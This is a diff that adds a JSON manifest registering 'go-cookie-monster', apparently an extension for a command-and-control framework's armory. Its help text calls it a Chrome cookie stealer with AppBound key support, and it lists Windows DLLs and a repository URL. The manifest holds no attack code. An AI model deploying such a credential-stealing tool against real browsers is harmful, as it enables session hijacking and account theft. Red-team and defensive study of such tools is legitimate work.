@@ -1,0 +1,23 @@
+{
+    "name": "go-cookie-monster",
+    "version": "0.0.0",
+    "command_name": "go-cookie-monster",
+    "extension_author": "c2biz",
+    "original_author": "c2biz",
+    "repo_url": "https://github.com/sliverarmory/go-cookie-monster",
+    "help": "Chrome cookie stealer with AppBound key support",
+    "long_help": "",
+    "entrypoint": "Run",
+    "files": [
+      {
+        "os": "windows",
+        "arch": "amd64",
+        "path": "go-cookie-monster.dll"
+      },
+      {
+        "os": "windows",
+        "arch": "386",
+        "path": "go-cookie-monster.dll"
+      }
+    ]
+  }
